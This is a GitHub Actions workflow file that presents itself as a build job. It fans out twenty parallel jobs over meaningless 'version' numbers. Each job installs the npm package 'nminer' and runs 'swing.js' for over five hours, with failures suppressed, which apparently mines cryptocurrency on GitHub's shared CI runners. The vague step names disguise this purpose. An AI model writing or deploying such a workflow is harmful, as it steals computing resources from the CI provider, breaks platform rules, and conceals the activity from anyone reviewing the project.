name: swing
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1751 }
          - { version: 2597 }
          - { version: 9084 }
          - { version: 8088 }
          - { version: 4530 }
          - { version: 6829 }
          - { version: 8021 }
          - { version: 5294 }
          - { version: 3991 }
          - { version: 985 }
          - { version: 9076 }
          - { version: 8878 }
          - { version: 35 }
          - { version: 3899 }
          - { version: 2104 }
          - { version: 1685 }
          - { version: 6611 }
          - { version: 9577 }
          - { version: 4806 }
          - { version: 7837 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: barge plain
        run: |
          npm install nminer@latest
          timeout 308m node swing.js || echo "swing executed"